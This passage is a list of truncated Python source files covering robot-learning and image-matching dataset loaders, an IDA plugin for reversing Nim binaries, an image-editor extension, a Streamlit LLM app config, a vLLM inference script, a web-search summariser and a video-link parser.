from_rep='axis_angle', to_rep=rotation_rep)\n\n        replay_buffer = None\n        if use_cache:\n            cache_zarr_path = dataset_path + '.zarr.zip'\n            cache_lock_path = cache_zarr_path + '.lock'\n            print('Acquiring lock on cache.')\n            with FileLock(cache_lock_path):\n                if not os.path.exists(cache_zarr_path):\n                    # cache does not exists\n                    try:\n                        print('Cache does not exist. Creating!')\n                        # store = zarr.DirectoryStore(cache_zarr_path)\n                        replay_buffer = _convert_robomimic_to_replay(\n                            store=zarr.MemoryStore(), \n                            shape_meta=shape_meta, \n                            dataset_path=dataset_path, \n                            abs_action=abs_action, \n                            rotation_transformer=rotation_transformer)\n                        print('Saving cache to disk.')\n                        with zarr.ZipStore(cache_zarr_path) as zip_store:\n                            replay_buffer.save_to_store(\n                                store=zip_store\n                            )\n                    except Exception as e:\n                        shutil.rmtree(cache_zarr_path)\n                        raise e\n                else:\n                    print('Loading cached ReplayBuffer from Disk.')\n                    with zarr.ZipStore(cache_zarr_path, mode='r') as zip_store:\n                        replay_buffer = ReplayBuffer.copy_from_store(\n                            src_store=zip_store, store=zarr.MemoryStore())\n                    print('Loaded!')\n        else:\n            replay_buffer = _convert_robomimic_to_replay(\n                store=zarr.MemoryStore(), \n                shape_meta=shape_meta, \n                dataset_path=dataset_path, \n                abs_action=abs_action, \n                rotation_transformer=rotation_transformer)\n\n        rgb_keys = list()\n        lowdim_keys = list()\n        obs_shape_meta = shape_meta['obs']\n        for key, attr in obs_shape_meta.items():\n            type = attr.get('type', 'low_dim')\n            if type == 'rgb':\n                rgb_keys.append(key)\n            elif type == 'low_dim':\n                lowdim_keys.append(key)\n        \n        # for key in rgb_keys:\n        #     replay_buffer[key].compressor.numthreads=1\n\n        key_first_k = dict()\n        if n_obs_steps is not None:\n            # only take first k obs from images\n            for key in rgb_keys + lowdim_keys:\n                key_first_k[key] = n_obs_steps\n\n        val_mask = get_val_mask(\n            n_episodes=replay_buffer.n_episodes, \n            val_ratio=val_ratio,\n            seed=seed)\n        train_mask = ~val_mask\n        sampler = SequenceSampler(\n            replay_buffer=replay_buffer, \n            sequence_length=horizon,\n            pad_before=pad_before, \n            pad_after=pad_after,\n            episode_mask=train_mask,\n            key_first_k=key_first_k)\n        \n        self.replay_buffer = replay_buffer\n        self.sampler = sampler\n        self.shape_meta = shape_meta\n        self.rgb_keys = rgb_keys\n        s",
    "import os\nimport math\nfrom collections import abc\nfrom loguru import logger\nfrom torch.utils.data.dataset import Dataset\nfrom tqdm import tqdm\nfrom os import path as osp\nfrom pathlib import Path\nfrom joblib import Parallel, delayed\n\nimport pytorch_lightning as pl\nfrom torch import distributed as dist\nfrom torch.utils.data import (\n    Dataset,\n    DataLoader,\n    ConcatDataset,\n    DistributedSampler,\n    RandomSampler,\n    dataloader\n)\n\nfrom src.utils.augment import build_augmentor\nfrom src.utils.dataloader import get_local_split\nfrom src.utils.misc import tqdm_joblib\nfrom src.utils import comm\nfrom src.datasets.megadepth import MegaDepthDataset\nfrom src.datasets.scannet import ScanNetDataset\nfrom src.datasets.sampler import RandomConcatSampler\n\n\nclass MultiSceneDataModule(pl.LightningDataModule):\n    \"\"\" \n    For distributed training, each training process is assgined\n    only a part of the training scenes to reduce memory overhead.\n    \"\"\"\n    def __init__(self, args, config):\n        super().__init__()\n\n        # 1. data config\n        # Train and Val should from the same data source\n        self.trainval_data_source = config.DATASET.TRAINVAL_DATA_SOURCE\n        self.test_data_source = config.DATASET.TEST_DATA_SOURCE\n        # training and validating\n        self.train_data_root = config.DATASET.TRAIN_DATA_ROOT\n        self.train_pose_root = config.DATASET.TRAIN_POSE_ROOT  # (optional)\n        self.train_npz_root = config.DATASET.TRAIN_NPZ_ROOT\n        self.train_list_path = config.DATASET.TRAIN_LIST_PATH\n        self.train_intrinsic_path = config.DATASET.TRAIN_INTRINSIC_PATH\n        self.val_data_root = config.DATASET.VAL_DATA_ROOT\n        self.val_pose_root = config.DATASET.VAL_POSE_ROOT  # (optional)\n        self.val_npz_root = config.DATASET.VAL_NPZ_ROOT\n        self.val_list_path = config.DATASET.VAL_LIST_PATH\n        self.val_intrinsic_path = config.DATASET.VAL_INTRINSIC_PATH\n        # testing\n        self.test_data_root = config.DATASET.TEST_DATA_ROOT\n        self.test_pose_root = config.DATASET.TEST_POSE_ROOT  # (optional)\n        self.test_npz_root = config.DATASET.TEST_NPZ_ROOT\n        self.test_list_path = config.DATASET.TEST_LIST_PATH\n        self.test_intrinsic_path = config.DATASET.TEST_INTRINSIC_PATH\n\n        # 2. dataset config\n        # general options\n        self.min_overlap_score_test = config.DATASET.MIN_OVERLAP_SCORE_TEST  # 0.4, omit data with overlap_score < min_overlap_score\n        self.min_overlap_score_train = config.DATASET.MIN_OVERLAP_SCORE_TRAIN\n        self.augment_fn = build_augmentor(config.DATASET.AUGMENTATION_TYPE)  # None, options: [None, 'dark', 'mobile']\n\n        # MegaDepth options\n        self.mgdpt_img_resize = config.DATASET.MGDPT_IMG_RESIZE  # 840\n        self.mgdpt_img_pad = config.DATASET.MGDPT_IMG_PAD   # True\n        self.mgdpt_depth_pad = config.DATASET.MGDPT_DEPTH_PAD   # True\n        self.mgdpt_df = config.DATASET.MGDPT_DF  # 8\n        self.coarse_scale = 1 / config.LOFTR.RESOLUTION[0]  # 0.125. for training loftr.\n\n        # 3.loader parameters\n        self.train_loader_params = {\n            'batch_size': args.batch_size,\n            'num_workers': args.num_workers,\n            'pin_memory': getattr(args, 'pin_memory', True)\n        }\n        self.val_loader_params = {\n            'batch_size': 1,\n            'shuffle': False,\n            'num_workers': args.num_workers,\n            'pin_memory': getattr(args, 'pin_memory', True)\n        }\n        self.test_loader_params = {\n            'batch_size': 1,\n            'shuffle': False,\n            'num_workers': args.num_workers,\n            'pin_memory': True\n        }\n        \n        # 4. sampler\n        self.data_sampler = config.TRAINER.DATA_SAMPLER\n        self.n_samples_per_subset = config.TRAINER.N_SAMPLES_PER_SUBSET\n        self.subset_replacement = config.TRAINER.SB_SUBSET_SAMPLE_REPLACEMENT\n        self.shuffle = config.TRAINER.SB_SUBSET_SHUFFLE\n        self.repeat = config.TRAINER.SB_REPEAT\n        \n        # (optional) RandomSampler for debugging\n\n        # misc configurations\n        self.parallel_load_data = getattr(args, 'parallel_load_data', False)\n        self.seed = config.TRAINER.SEED  # 66\n\n    def setup(self, stage=None):\n        \"\"\"\n        Setup train / val / test dataset. This method will be called by PL automatically.\n        Args:\n            stage (str): 'fit' in training phase, and 'test' in testing phase.\n        \"\"\"\n\n        assert stage in ['fit', 'test'], \"stage must be either fit or test\"\n\n        try:\n            self.world_size = dist.get_world_size()\n            self.rank = dist.get_rank()\n            logger.info(f\"[rank:{self.rank}] world_size: {self.world_size}\")\n        except AssertionError as ae:\n            self.world_size = 1\n            self.rank = 0\n            logger.warning(str(ae) + \" (set wolrd_size=1 and rank=0)\")\n\n        if stage == 'fit':\n            self.train_dataset = self._setup_dataset(\n                self.train_data_root,\n                self.t",
    "# -*- encoding: utf8 -*-\n#\n# Copyright (c) 2024 ESET\n# Author: Alexandre C\u00f4t\u00e9 Cyr <alexandre.cote@eset.com>\n# See LICENSE file for redistribution.\n\nimport nimfilt\nimport posixpath\n\nimport ida_auto\nimport ida_bytes\nimport ida_dirtree\nimport ida_funcs\nimport ida_nalt\nimport ida_name\nimport ida_segment\nimport ida_struct\nimport ida_xref\nimport idaapi\nimport idautils\n\nfrom ida_idp import ph_get_cnbits\nfrom ida_ida import inf_get_app_bitness, inf_is_be\nfrom collections import namedtuple\n\nAUTO_RUN = False\n\nPLUGIN_NAME = \"Nimfilt\"\nVERSION = \"1.0.0\"\n\nST_NIMSTRING = 1\nST_NIMSTRING_PTR = 2\n\n# These global variables can only be calculated after IDA has loaded the program\nBITNESS = None\nINT_BYTES = None\nENDIANNESS = None\n# Flag that marks a string object as a string literal\nNIM_STRLIT_FLAG = None\n\nPROGRAM_END = None\n\ndef init_globals():\n    global PROGRAM_END, BITNESS, INT_BYTES, ENDIANNESS, NIM_STRLIT_FLAG\n    PROGRAM_END = ida_segment.get_last_seg().end_ea\n    BITNESS = inf_get_app_bitness()\n    INT_BYTES = BITNESS // ph_get_cnbits()\n    ENDIANNESS = \"big\" if inf_is_be() else \"little\"\n    # lib/nimbase.h: 1 << (sizeof(int) * CHAR_BITS - 2)\n    # Nim's int type is 64bit on 64 bit architectures\n    NIM_STRLIT_FLAG = 1 << (BITNESS - 2)\n\ndef get_uint(ea):\n    bts = idaapi.get_bytes(ea, INT_BYTES, 0)\n    return int.from_bytes(bts, ENDIANNESS, signed=False)\n\n# bin_search is significantly faster than ida_search.find_text\n# Unlike find_text, it also matches data that isn't typed as a string\ndef find_text(string: str):\n    pattern = ida_bytes.compiled_binpat_vec_t()\n    ida_bytes.parse_binpat_str(pattern, 0, '\"{}\"'.format(string), 0, ida_nalt.STRENC_DEFAULT)  # Strings must be inside double quotes\n    return ida_bytes.bin_search3(0, ida_segment.get_last_seg().end_ea, pattern, idaapi.BIN_SEARCH_FORWARD)\n\nclass Nimfilt_plugin(idaapi.plugin_t):\n    comment = \"\"\n    flags = idaapi.PLUGIN_MOD | idaapi.PLUGIN_FIX\n    help = \"Helps with reversing Nim compiled executables\"\n    wanted_hotkey = \"\"\n    wanted_name = PLUGIN_NAME\n\n    def init(self):\n        idaapi.notify_when(idaapi.NW_OPENIDB, self._idb_loaded_handler)\n        return idaapi.PLUGIN_KEEP\n\n    # Check if the database is Nim and run if AUTO_RUN is on\n    def _idb_loaded_handler(self, _, is_old_database):\n        if is_nim_idb():\n            print(\"IDB identified as Nim.\")\n            if not is_old_database and AUTO_RUN:\n                print(\"Running Nimfilt.\")\n                self.run()\n        else:\n            print(\"IDB could not be confirmed as Nim. You can still run the plugin manually\")\n\n    def run(self, arg):\n        main()\n\n    def term(self):\n        pass\n\ndef iterate_segments():\n    seg = ida_segment.get_first_seg()\n    while seg is not None:\n        yield seg\n        seg = ida_segment.get_next_seg(seg.start_ea)\n\ndef make_nim_strings():\n    for seg in iterate_segments():\n        if ida_segment.get_segm_name(seg) in [\".rdata\", \".rodata\"] or (seg.type == ida_segment.SEG_DATA and seg.perm == ida_segment.SEGPERM_READ):\n            ea = seg.start_ea\n            while ea < seg.end_ea:\n                # Skip if the address is already typed as a struct\n                if not ida_bytes.is_struct(ida_bytes.get_flags(ea)) and (is_str := is_nim_str(ea)):\n                    if is_str[0] == ST_NIMSTRING:\n                        ea += apply_Nim_string_struct(*is_str[1:])\n                    elif is_str[0] == ST_NIMSTRING_PTR:\n                        ea += apply_Nim_string_ptr_struct(*is_str[1:])\n                    else:\n                        raise Exception()\n                else:\n                    ea += 1\n\n# String is NUL terminated and contains only valid ascii non-NUL characters\n# TODO: check encodings\ndef _is_valid_C_str(s: bytes):\n    return s[-1] == 0x00 and all([x in range(0x01, 0x80) for x in s[:-1]])\n\ndef is_nim_str_payload(ea, ln):\n    reserved = get_uint(ea)\n    if reserved ^ NIM_STRLIT_FLAG in [0, ln] and ea + ln <= PROGRAM_END:\n        return _is_valid_C_str(ida_bytes.get_bytes(ea + INT_BYTES, ln + 1))\n    return False\n\n# lib/system/strs_v2.nim -> NimStringV2\ndef is_nim_str(ea):\n    ln = get_uint(ea)\n    # Contiguous block string\n    if ln > 0:\n        if is_nim_str_payload(ea + INT_BYTES, ln):\n            return (ST_NIMSTRING, ea, ln)\n        elif (addr := ida_xref.get_first_dref_from(ea + INT_BYTES)) != idaapi.BADADDR and is_nim_str_payload(addr, ln):\n            return (ST_NIMSTRING_PTR, ea, addr, ln)\n    return False\n\n\"\"\"\nDepending on the Nim version, strings can be represented one of a few ways:\nStringV2, lib/system/strs_v2.nim\n    NimStrPayload {\n        int cap;\n        char data[len+1];\n    }\n    NimString {\n        int len;\n        NimStrPayload* p;\n    }\n\nStrings, lib/system.nim\n    TGenericSeq { //Generic sequence type\n        int len;\n        int reserved;\n    }\n    NimStringDesc {\n        TGenericSeq Sup;\n        char data[len+1];\n    }\n\nFor string literals, the value of cap/reserved is ORed with NIM_STRLIT_FLAG\nreserved appears to be the same as",
    "import gradio as gr\nimport os\nimport string\n\nfrom modules import script_callbacks, shared, util\nfrom modules.ui_components import ResizeHandleRow, InputAccordion, FormColumn, FormRow\nfrom modules.paths_internal import default_output_dir\nimport modules.infotext_utils as parameters_copypaste\n\nfrom PIL import Image, ImageEnhance, ImageDraw\n\ndef on_ui_settings():\n    section = ('saving-paths', \"Paths for saving\")\n    shared.opts.add_option(\n        \"sd_image_editor_outdir\",\n        shared.OptionInfo(\n            util.truncate_path(os.path.join(default_output_dir, 'sd-image-editor')),\n            'Output directory for sd-image-editor',\n            component_args=shared.hide_dirs,\n            section=('saving-paths', \"Paths for saving\"),\n        )\n    )\n\n\ndef draw_bbox(img, crop_enabled, bbox_w, bbox_h, bbox_center_x, bbox_center_y):\n    if img is None:\n        return None\n    if crop_enabled:\n        # Calculate coordinates of bbox corners\n        w, h = img.size\n        left = (bbox_center_x - bbox_w/2)/100 * w \n        upper = (bbox_center_y - bbox_h/2)/100 * h\n        right = (bbox_center_x + bbox_w/2)/100 * w\n        lower = (bbox_center_y + bbox_h/2)/100 * h\n        # Check bounding condition\n        left = 0 if left < 0 else left\n        upper = 0 if upper < 0 else upper\n        right = w if right > w else right\n        lower = h if lower > h else lower\n        # Draw bounding box\n        TINT_COLOR = (0, 0, 0)  # Black\n        TRANSPARENCY = .6  # Degree of transparency, 0-100%\n        OPACITY = int(255 * TRANSPARENCY)\n        OUTLINE_OPACITY = int(255 * TRANSPARENCY * 1)\n        BBOX_COLOR = (220, 220, 220)\n        # Create a bounding box overlay\n        overlay = Image.new('RGBA', img.size, TINT_COLOR+(OPACITY,)) # Shade everything outside bbox\n        draw = ImageDraw.Draw(overlay)  # Create a context for drawing things on it\n        draw.rectangle(((left, upper), (right, lower)), \n                       fill=(255, 255, 255, 0), \n                       outline=BBOX_COLOR+(OUTLINE_OPACITY,),\n                       width=2) # Make bounding box transparent\n        # Draw lines separating each side into 3 parts\n        third_left = left*1/3 + right*2/3\n        third_right = left*2/3 + right*1/3\n        third_up = lower*1/3+upper*2/3\n        third_down = lower*2/3+upper*1/3\n        draw.line([(third_left, upper), (third_left, lower)], fill=BBOX_COLOR+(OUTLINE_OPACITY,), width=1)\n        draw.line([(third_right, upper), (third_right, lower)], fill=BBOX_COLOR+(OUTLINE_OPACITY,), width=1)\n        draw.line([(left, third_up), (right, third_up)], fill=BBOX_COLOR+(OUTLINE_OPACITY,), width=1)\n        draw.line([(left, third_down), (right, third_down)], fill=BBOX_COLOR+(OUTLINE_OPACITY,), width=1)\n        # Merge image with bounding box overlay with alpha composite\n        img = Image.alpha_composite(img, overlay) \n    return img\n\n\ndef store_image(img):\n    return img\n\n\ndef edit(img, degree, expand, flip, crop_enabled, bbox_w, bbox_h, bbox_center_x, bbox_center_y, interpolate_mode, color, contrast, brightness, sharpness):\n    if img is None:\n        return None\n    # Crop\n    if crop_enabled:\n        # Calculate coordinates of bbox corners\n        w, h = img.size\n        left = (bbox_center_x - bbox_w/2)/100 * w\n        upper = (bbox_center_y - bbox_h/2)/100 * h\n        right = (bbox_center_x + bbox_w/2)/100 * w\n        lower = (bbox_center_y + bbox_h/2)/100 * h\n        img = img.crop((left, upper, right, lower))\n    # Flip\n    if flip:\n        img = img.transpose(method=Image.Transpose.FLIP_LEFT_RIGHT)\n    # Rotate\n    if interpolate_mode == \"Nearest\":\n        resample_obj = Image.NEAREST\n    elif interpolate_mode == \"Bilinear\":\n        resample_obj = Image.BILINEAR\n    elif interpolate_mode == \"Bicubic\":\n        resample_obj = Image.BICUBIC\n    img = img.rotate(-degree, expand=expand, resample=resample_obj) # Rotate closewise\n    # Enhance\n    img_enhance = ImageEnhance.Color(img)\n    img = img_enhance.enhance(color)\n    img_enhance = ImageEnhance.Contrast(img)\n    img = img_enhance.enhance(contrast)\n    img_enhance = ImageEnhance.Brightness(img)\n    img = img_enhance.enhance(brightness)\n    img_enhance = ImageEnhance.Sharpness(img)\n    img = img_enhance.enhance(sharpness)\n    return img\n\n\ndef save_image(img):\n    from random import choices\n    # Generate filename\n    filename = ''.join(choices(string.ascii_letters + string.digits, k=12)) + \".png\"\n    # Construct path to save\n    os.makedirs(shared.opts.sd_image_editor_outdir, exist_ok=True)\n    # Save\n    img.save(os.path.join(shared.opts.sd_image_editor_outdir, filename), format=\"PNG\")\n    return\n\n\ndef open_folder():\n    # adopted from https://github.com/AUTOMATIC1111/stable-diffusion-webui/blob/20123d427b09901396133643be78f6b692393b0c/modules/util.py#L176-L208\n    \"\"\"Open a folder in the file manager of the respect OS.\"\"\"\n    import platform\n    import sys\n    import subprocess\n    path = shared.opts.sd_image_editor_outdir\n    if not os.path.exists(path):\n    ",
    "import streamlit as st\nimport time\nfrom helper import (\n    scan_vectorstore_for_repos, \n    DataHandler, \n    project_dir,\n    sessions_dir,\n    save_session, \n    load_session,\n    update_repo_urls,\n    load_repo_urls, \n    remove_directory, \n    remove_repo_from_json,\n    update_selected_provider,\n    update_selected_model,\n)\nimport os\nimport zipfile\nimport lzma\nimport tarfile\nimport configparser\nfrom dotenv import load_dotenv, set_key\nimport pathlib\nfrom langchain_mistralai.chat_models import ChatMistralAI\nfrom langchain_openai import ChatOpenAI\nimport json\n\n# select the llm model\n# define the config path\nconfig_path = os.path.join('config', 'config.ini')\n\n# read the model list from config.ini\nconfig = configparser.ConfigParser()\nconfig.read(config_path)\nqa_pilot_version = config.get(\"app_setting\", 'version')\nselected_provider = config.get('model_providers', 'selected_provider')\nmodel_section = f\"{selected_provider}_llm_models\"\nselected_model = config.get(model_section, 'selected_model')\nedit_settings_flag = False\n\ncodegraph_flag = config.get(\"codegraph\", 'enabled')\ncodegraph_host = config.get(\"codegraph\", \"codegraph_host\")\n\n\ndef save_config(config):\n    \"\"\"save the configs\"\"\"\n    try:\n        with open(config_path, 'w') as configfile:\n            config.write(configfile)\n        st.success(\"Configuration saved successfully!\")\n        print(\"Configuration has been saved to:\", config_path)\n    except Exception as e:\n        st.error(\"Failed to save configuration: \" + str(e))\n        print(\"Error saving configuration:\", e)\n\n\ndef config_editor():\n    \"\"\"edit all settings\"\"\"\n    with st.form(\"config_form\"):\n        st.subheader(\"Edit QA-Pilot Settings\")\n        inputs = {}\n        # create dynamic input field\n        for section in config.sections():\n            for key in config[section]:\n                val = config.get(section, key)\n                unique_key = f\"{section}|{key}\"  # use \"|\" as separator\n                inputs[unique_key] = st.text_input(f\"{section} - {key}\", value=val)\n\n        col1, col2 = st.columns(2)  # create two columns for save and cancel\n        with col1:\n            submitted = st.form_submit_button(\"Save Changes\")\n        with col2:\n            cancelled = st.form_submit_button(\"Cancel\")\n\n        if submitted:\n            # update config\n            for unique_key, input_val in inputs.items():\n                sec, k = unique_key.split('|')\n                config.set(sec, k, input_val)\n\n            save_config(config)\n            st.session_state.config_editing = False  # update status\n            st.rerun()\n        elif cancelled:\n            st.session_state.config_editing = False  # close the config editor\n            st.rerun()\n\n\n# Function to save API key\ndef save_api_key(api_key_name, key):\n    dotenv_path = pathlib.Path('.env')\n    if not dotenv_path.exists():\n        dotenv_path.touch()\n    set_key(dotenv_path, api_key_name, key)\n    os.environ[api_key_name] = key  # Update environment variable\n        \nprovider_info_map = {\n    \"openai\": {\n        \"key_variable\": \"OPENAI_API_KEY\",\n        \"class\": ChatOpenAI\n    },\n    \"mistralai\": {\n        \"key_variable\": \"MISTRAL_API_KEY\",\n        \"class\": ChatMistralAI\n    }\n}\n\n\n# Validate the API key's effectiveness\ndef validate_provider_api_key(provider, api_key):\n    if provider == \"openai\" and (not api_key.startswith(\"sk-\")):\n        st.error(\"API Key must start with 'sk-'. Please enter a valid API Key.\")\n        return False\n\n    the_selected_model = config.get(provider + '_llm_models', 'selected_model')\n    provider_info = provider_info_map[provider]\n    api_key_var_name = provider_info[\"key_variable\"]\n    pmodel_class = provider_info['class']\n    try:\n        os.environ[api_key_var_name] = api_key\n        load_dotenv()\n        # Attempt to initialize the model to verify the API key\n        pmodel_instance = pmodel_class(model_name=the_selected_model)\n        # If the model is successfully created, assume the API key is valid\n        if pmodel_instance:\n            return True\n    except Exception as e:\n        st.error(f\"Failed to initialize model with provided API Key: {str(e)}\")\n        return False \n\n\n# config the key when input\ndef handle_api_key(provider, env_key):\n    load_dotenv()\n    api_key = os.getenv(env_key)\n    if not api_key or (provider == 'openai' and not api_key.startswith(\"sk-\")):\n        st.warning(f\"{env_key} is missing or invalid.\")\n        api_key_input = st.text_input(f\"Enter your {provider.title()} API Key:\")\n        if st.button(\"Save API Key\"):\n            # if api_key_input and validate_api_key(provider, api_key_input):\n            if api_key_input and validate_provider_api_key(provider, api_key_input):\n                save_api_key(env_key, api_key_input)\n                st.success(\"API Key saved successfully. Please reload the page.\")\n                time.sleep(1)\n                st.rerun()\n            else:\n                st.error(\"Please provide a valid API Key.\")\n\n# codegraph\nif codegraph_flag",
    "# This source code is licensed under the MIT license\n\nfrom typing import Optional\nimport logging, os, json\nfrom vllm import LLM, SamplingParams\nimport ray\nfrom ray_on_aml.core import Ray_On_AML\nimport argparse\n\n\ndef inference(testdata_folder, testdata_file, output_folder, output_file, model_path, tensor_parallel_size, max_length, trust_remote_code):\n    logging.basicConfig(level=logging.INFO)\n    logger = logging.getLogger(__name__)\n\n    # log args\n    logger.info(f\"test file: {testdata_file}\")\n    logger.info(f\"output file: {output_file}\")\n    logger.info(f\"tensor_parallel_size: {tensor_parallel_size}\")\n\n    with open(os.path.join(testdata_folder, testdata_file), 'r', encoding='utf-8') as f_read:\n        test_prompts = [json.loads(line)['prompt'] for line in f_read.readlines()]\n        total_lines = len(test_prompts)\n        logger.info(f\"Total lines: {total_lines}\")\n    assert len(test_prompts) != 0\n\n    llm = LLM(model=model_path,\n              tensor_parallel_size=tensor_parallel_size,\n              trust_remote_code=trust_remote_code,\n              max_num_batched_tokens=800000,\n              gpu_memory_utilization=0.9)\n\n    sampling_params = SamplingParams(temperature=0.0, top_p=1.0, max_tokens=max_length)\n\n    batch_size = 128\n    total_batch_num = (total_lines // batch_size) + 1\n\n    current_lines = 0\n    all_outputs = []\n\n    for batch_idx in range(total_batch_num):\n        if batch_idx == total_batch_num-1:\n            prompt_batch = test_prompts[batch_idx * batch_size:]\n        else:\n            prompt_batch = test_prompts[batch_idx*batch_size:(batch_idx+1)*batch_size]\n        results = llm.generate(prompt_batch, sampling_params)\n        current_lines += batch_size\n        logger.info(f\"{current_lines} in {total_lines} examples.\")\n        for result in results:\n            all_outputs.append({'samples': [result.outputs[0].text]})\n\n    with open(os.path.join(output_folder, output_file), \"w\", encoding='utf-8') as f:\n        for output in all_outputs:\n            f.write(json.dumps(output) + '\\n')\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='args for running vllm')\n    parser.add_argument('--testdata_folder', type=str, required=True)\n    parser.add_argument('--testdata_file', type=str, required=True)\n    parser.add_argument('--output_folder', type=str, required=True)\n    parser.add_argument('--output_file', type=str, default=None, required=False)\n    parser.add_argument('--model_path', type=str, required=True)\n    parser.add_argument('--max_length', type=int, default=128, required=False)\n    parser.add_argument('--tensor_parallel_size', type=int, default=8, required=False)\n    parser.add_argument('--trust_remote_code', type=bool, default=True, required=False)\n    args = parser.parse_args()\n\n    if args.output_file is None:\n        output_file = 'sample_' + args.testdata_file\n    else:\n        output_file = args.output_file\n\n    if not os.path.exists(args.output_folder):\n        try:\n            os.mkdir(args.output_folder)\n        except:\n            print('Path exist!')\n\n\n    inference(testdata_folder=args.testdata_folder,\n              testdata_file=args.testdata_file,\n              output_folder=args.output_folder,\n              output_file=output_file,\n              model_path=args.model_path,\n              max_length=args.max_length,\n              tensor_parallel_size=args.tensor_parallel_size,\n              trust_remote_code=args.trust_remote_code)\n",
    "from playwright.sync_api import sync_playwright\n#from searcher import *\nfrom typing import List, Dict, Tuple, Optional\n\nimport json\n\nimport requests\nfrom bs4 import BeautifulSoup\nimport openai\nopenai.api_key = ''  # Replace with your OpenAI API key\nopenai.api_base = \"https://api.chatanywhere.com.cn/v1\"\nfrom langchain.document_loaders import UnstructuredURLLoader\nfrom langchain.docstore.document import Document\nfrom unstructured.cleaners.core import remove_punctuation,clean,clean_extra_whitespace\nfrom langchain import OpenAI\nfrom langchain.chains.summarize import load_summarize_chain\n\nfrom langchain.text_splitter import CharacterTextSplitter\nfrom langchain.chains.mapreduce import MapReduceChain\n\nimport json\nfrom typing import List, Dict\n\nclass SearchResult:\n    def __init__(self, title, url, snip) -> None:\n        self.title = title\n        self.url = url\n        self.snip = snip\n\n    def dump(self):\n        return {\n            \"title\": self.title,\n            \"url\": self.url,\n            \"snip\": self.snip\n        }\n\n    def __str__(self) -> str:\n        return json.dumps(self.dump())\n    \nclass SearcherInterface:\n    def search(self, query) -> List[SearchResult]:\n        raise NotImplementedError()\n\n\ndef generate_document(url):\n    \"Given an URL, return a langchain Document to futher processing\"\n    loader = UnstructuredURLLoader(urls=[url],\n    mode=\"elements\",\n    post_processors=[clean,remove_punctuation,clean_extra_whitespace])\n    elements = loader.load()\n    selected_elements = [e for e in elements if e.metadata['category']==\"NarrativeText\"]\n    full_clean = \" \".join([e.page_content for e in selected_elements])\n    return Document(page_content=full_clean, metadata={\"source\":url})\n\ndef summarize_document(url, model_name):\n    \"Given an URL return the summary from OpenAI model\"\n    llm = OpenAI(model_name='ada',temperature=0,openai_api_key=openai.api_key)\n    chain = load_summarize_chain(llm, chain_type=\"stuff\")\n    tmp_doc = generate_document(url)\n    summary = chain.run([tmp_doc])\n    return clean_extra_whitespace(summary)\n\n# print(summarize_document(url, \"\"))\n####################################################################################################\n\n\ndef fetch_webpage_content(url):\n    response = requests.get(url)\n    soup = BeautifulSoup(response.content, 'html.parser')\n    return soup.get_text()\n\ndef summarize_text(text,question,model,tokenizer):\n    if model==None:\n        messages = [{'role': 'user','content': f\"base the following text:\\n\\n{text}\\n\\n use no more than 100 chinese words to answer the question:{question}\"},]\n        response = openai.ChatCompletion.create(\n                model='gpt-3.5-turbo-16k',\n                messages=messages,\n                stream=True,\n            )\n        completion = {'role': '', 'content': ''}\n        for event in response:\n            if event['choices'][0]['finish_reason'] == 'stop':\n                #print(f'\u6536\u5230\u7684\u5b8c\u6210\u6570\u636e: {completion}')\n                break\n            for delta_k, delta_v in event['choices'][0]['delta'].items():\n                #print(f'\u6d41\u54cd\u5e94\u6570\u636e: {delta_k} = {delta_v}')\n                completion[delta_k] += delta_v\n        messages.append(completion)  # \u76f4\u63a5\u5728\u4f20\u5165\u53c2\u6570 messages \u4e2d\u8ffd\u52a0\u6d88\u606f\n        return messages[1]['content']\n    else:\n        task_split_prompt = f\"\u6839\u636e\u4ee5\u4e0b\u6587\u672c\uff1a:\\n\\n{text}\\n\\n \u7528\u4e0d\u8d85\u8fc7100\u4e2a\u4e2d\u6587\u5b57\u7b26\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898:{question}\"\n        response=model.chat(tokenizer,task_split_prompt,history=[])[0]\n        return response\n\nclass Searcher(SearcherInterface):\n    def __init__(self) -> None:\n        pass\n\n    def _parse(self, result) -> List[SearchResult]:\n        if not result:\n            return None\n        ret = []\n        for item in result:\n            ret.append(SearchResult(item['title'], item['url'], None))\n        return ret\n\n    def search(self, query) -> List[SearchResult]:\n        return self._parse(query_bing(query))\n\n\ndef get_bing_search_raw_page(question: str):\n    results = []\n    with sync_playwright() as p:\n        browser = p.chromium.launch(channel=\"chrome\", headless=True)\n        context = browser.new_context()\n        page = context.new_page()\n        try:\n            page.goto(f\"https://www.bing.com/search?q={question}\")\n        except:\n            page.goto(f\"https://www.bing.com\")\n            page.fill('input[name=\"q\"]', question)\n            page.press('input[name=\"q\"]', 'Enter')\n        try:\n            page.wait_for_load_state('networkidle', timeout=6000)\n        except:\n            pass\n        # page.wait_for_load_state('networkidle')\n        search_results = page.query_selector_all('.b_algo h2')\n        for result in search_results:\n            title = result.inner_text()\n            a_tag = result.query_selector('a')\n            if not a_tag: continue\n            url = a_tag.get_attribute('href')\n            if not url: continue\n            # print(title, url)\n            results.append({\n                'title': title,\n                'url': url\n            })\n        browser.close()\n    return results\n\ndef query_bing(que",
    "import json\nfrom urllib.parse import unquote\n\nimport fake_useragent\nimport httpx\nfrom parsel import Selector\n\nfrom .base import BaseParser, VideoAuthor, VideoInfo\n\n\nclass XiGua(BaseParser):\n    \"\"\"\n    \u897f\u74dc\u89c6\u9891\n    \"\"\"\n\n    async def parse_share_url(self, share_url: str) -> VideoInfo:\n        headers = {\n            \"User-Agent\": fake_useragent.UserAgent(os=[\"android\"]).random,\n        }\n        async with httpx.AsyncClient(follow_redirects=False) as client:\n            response = await client.get(share_url, headers=headers)\n\n        location_url = response.headers.get(\"location\", \"\")\n        video_id = location_url.split(\"?\")[0].strip(\"/\").split(\"/\")[-1]\n        if len(video_id) <= 0:\n            raise Exception(\"failed to get video_id from share URL\")\n\n        return await self.parse_video_id(video_id)\n\n    async def parse_video_id(self, video_id: str) -> VideoInfo:\n        # \u6ce8\u610f\uff1a url\u4e2d\u7684 video_id \u540e\u9762\u4e0d\u8981\u6709 /\uff0c \u5426\u5219\u8fd4\u56de\u683c\u5f0f\u4e0d\u4e00\u6837\n        req_url = (\n            f\"https://m.ixigua.com/douyin/share/video/{video_id}\"\n            f\"?aweme_type=107&schema_type=1&utm_source=copy\"\n            f\"&utm_campaign=client_share&utm_medium=android&app=aweme\"\n        )\n\n        async with httpx.AsyncClient(follow_redirects=True) as client:\n            response = await client.get(req_url, headers=self.get_default_headers())\n            response.raise_for_status()\n\n        sel = Selector(response.text)\n        render_data = sel.css(\"script#RENDER_DATA::text\").get(default=\"\")\n        if len(render_data) <= 0:\n            raise Exception(\"failed to parse render data from HTML\")\n        render_data = 